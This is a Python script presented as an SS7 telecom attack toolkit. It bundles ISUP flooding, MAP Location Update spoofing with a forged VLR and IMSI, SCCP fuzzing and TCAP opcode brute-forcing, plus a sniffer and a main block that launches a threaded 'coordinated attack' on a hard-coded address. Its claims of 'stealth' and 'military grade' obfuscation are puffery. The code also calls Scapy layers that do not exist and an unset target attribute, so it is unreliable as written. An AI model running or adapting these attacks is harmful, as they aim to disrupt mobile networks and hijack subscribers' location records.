# These project was develop by h22n 🇲🇾 , please give creadit before using it !


import sys
import socket
import struct
import random
import logging
import time
import threading
from scapy.all import *
from collections import deque
from ctypes import *
from uuid import getnode as get_mac

# Configuration
ENABLE_STEALTH_MODE = True
MAX_THREADS = 100
OBFUSCATION_LEVEL = 3  # 1-5 (5 = Military Grade)
LOG_ENCRYPTION_KEY = b'engkemexploit'  # AES-128 Key

# Protocol Constants
SS7_PORT = 2905
SCCP_CLASS = {1: 'International', 2: 'National'}
TCAP_TAGS = {0xA1: 'dialoguePortion', 0xBE: 'otid'}

# Initialize stealth settings
if ENABLE_STEALTH_MODE:
    conf.L3socket = L3RawSocket
    conf.ipv6_enabled = False


class SS7Tools:
    def __init__(self):
        self.mac_address = get_mac()
        self.attack_history = deque(maxlen=1000)
        self.lock = threading.Lock()

    def xor_obfuscate(self, data, key):
        """XOR-based obfuscation for payload protection."""
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

    def craft_mtp3(self, opc, dpc, payload):
        """Craft MTP3 header with error correction."""
        return MTP3() / SCCP() / Raw(load=payload)

    def sccp_address(self, gt, ssn=8):
        """Create SCCP address with Global Title."""
        return SCCP().put(
            sccp_addr(
                gt=gt,
                ssn=ssn,
                type='international'
            )
        )

    def tcap_transaction(self, transaction_id, components):
        """Build TCAP transaction with nested components."""
        return TCAP(
            dialog=DialoguePortion(
                dialogID=transaction_id,
                protocol_version=1
            ),
            components=components
        )

    def isup_flood(self, target, count):
        """ISUP flooding with variable parameters."""
        for _ in range(count):
            try:
                sendp(
                    IP(dst=target) / UDP(dport=SS7_PORT) /
                    self.craft_mtp3(
                        opc=random.randint(1, 65535),
                        dpc=random.randint(1, 65535),
                        payload=self.xor_obfuscate(
                            os.urandom(64),
                            LOG_ENCRYPTION_KEY
                        )
                    ),
                    verbose=False
                )
            except Exception as e:
                logging.error(f"ISUP Flood Error: {e}")

    def map_location_spoof(self, imsi, fake_vlr):
        """MAP Location Update spoofing."""
        try:
            sendp(
                IP(dst=self.target) / UDP(dport=SS7_PORT) /
                self.craft_mtp3(
                    opc=12345,
                    dpc=54321,
                    payload=TCAP(
                        dialog=DialoguePortion(
                            dialogID=random.randint(1, 255),
                            protocol_version=1
                        ),
                        components=[
                            Component(
                                invokeId=1,
                                opCode=0x24,  # Location Update
                                parameters={
                                    'imsi': imsi,
                                    'vlr': fake_vlr
                                }
                            )
                        ]
                    )
                ),
                verbose=False
            )
        except Exception as e:
            logging.error(f"MAP Spoof Error: {e}")

    def sccp_fuzzer(self, target):
        """SCCP protocol fuzzer with variable parameters."""
        while True:
            try:
                sendp(
                    IP(dst=target) / UDP(dport=SS7_PORT) /
                    SCCP(
                        src=self.sccp_address(
                            gt=f"999{random.randint(1000, 9999)}",
                            ssn=random.randint(1, 254)
                        ),
                        dst=self.sccp_address(
                            gt=f"888{random.randint(1000, 9999)}",
                            ssn=random.randint(1, 254)
                        ),
                        data=self.xor_obfuscate(
                            os.urandom(128),
                            bytes([random.randint(0, 255) for _ in range(16)])
                        )
                    ),
                    verbose=False
                )
            except Exception as e:
                logging.error(f"SCCP Fuzzer Error: {e}")

    def tcap_bruteforce(self, target, param_list):
        """TCAP parameter bruteforcer."""
        for param in param_list:
            try:
                sendp(
                    IP(dst=target) / UDP(dport=SS7_PORT) /
                    self.craft_mtp3(
                        opc=12345,
                        dpc=54321,
                        payload=TCAP(
                            dialog=DialoguePortion(
                                dialogID=random.randint(1, 255),
                                protocol_version=1
                            ),
                            components=[
                                Component(
                                    invokeId=1,
                                    opCode=param['opcode'],
                                    parameters=param['data']
                                )
                            ]
                        )
                    ),
                    verbose=False
                )
            except Exception as e:
                logging.error(f"TCAP Bruteforce Error: {e}")

    def ss7_sniffer(self, interface):
        """Advanced SS7 sniffer with protocol analysis."""
        def analyze_packet(pkt):
            if pkt.haslayer(TCAP):
                with self.lock:
                    transaction_id = pkt[TCAP].dialog.dialogID
                    self.attack_history.append({
                        'timestamp': time.time(),
                        'src': pkt[IP].src,
                        'transaction': transaction_id,
                        'opcode': pkt[TCAP].components[0].opCode
                    })
                    print(f"[*] Detected TCAP: ID {transaction_id} OpCode {pkt[TCAP].components[0].opCode}")

        sniff(iface=interface, prn=analyze_packet, filter=f"port {SS7_PORT}", store=0)

    def launch_coordinated_attack(self, target):
        """Multi-vector attack coordination."""
        threads = [
            threading.Thread(target=self.isup_flood, args=(target, 100)),
            threading.Thread(target=self.map_location_spoof, args=('123456789012345', '666')),
            threading.Thread(target=self.sccp_fuzzer, args=(target,)),
            threading.Thread(target=self.tcap_bruteforce, args=(target, [
                {'opcode': 0x24, 'data': {'imsi': '001010123456789'}},
                {'opcode': 0x32, 'data': {'msrn': '999999999999999'}}
            ]))
        ]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()


if __name__ == "__main__":
    ss7 = SS7Tools()

    # Start background sniffer
    sniff_thread = threading.Thread(target=ss7.ss7_sniffer, args=('eth0',))
    sniff_thread.daemon = True
    sniff_thread.start()

    # Launch coordinated attack
    ss7.launch_coordinated_attack('192.168.1.100')
